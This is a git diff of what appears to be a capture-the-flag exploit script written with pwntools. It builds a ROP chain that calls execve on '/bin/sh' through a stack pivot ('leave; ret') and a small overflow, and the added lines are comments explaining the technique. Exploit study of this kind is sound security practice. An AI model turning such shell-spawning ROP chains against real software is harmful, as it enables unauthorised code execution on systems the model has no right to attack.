@@ -60,13 +60,16 @@ vault_addr = pie_base + elf.symbols['vault']
 bin_sh_offset = 0  # /bin/sh will be at vault_addr + 0
 bin_sh = vault_addr + 0
 
+
+#buffer overflow only reads 24B into 8B buffer. It cannot be used to write the whole ROP chain
+#instead we can write the ROP in the deposit() function, which writes on a global buffer
 rop_chain = flat (
         b'/bin/sh\x00',  
         p64(ret), 
         p64(pop_rdi), p64(bin_sh),
         p64(pop_rsi), p64(0),
-        p64(pop_rcx), p64(writable + 0x10),  # rcx - 0xa points into writable bss
-        p64(pop_rdx), p64(0),                 # side effect writes to bss, harmless
+        p64(pop_rcx), p64(writable + 0x10),  # rcx - 0xa points into writable bss. To neutralize impure pop rdx
+        p64(pop_rdx), p64(0),                 # side effect writes to bss, coulsn't find a clean pop rdx; ret
 
         p64(execve)
         
@@ -78,6 +81,9 @@ p.send(rop_chain)
 
 p.sendline(b'3')
 p.recvuntil(b'combination:')
+
+
+#then we pass the global buffer and call a leave; ret
 payload = flat(
     b'A' * 8,               # fill buf
     p64(vault_addr),        # saved rbp — leave will set rsp here
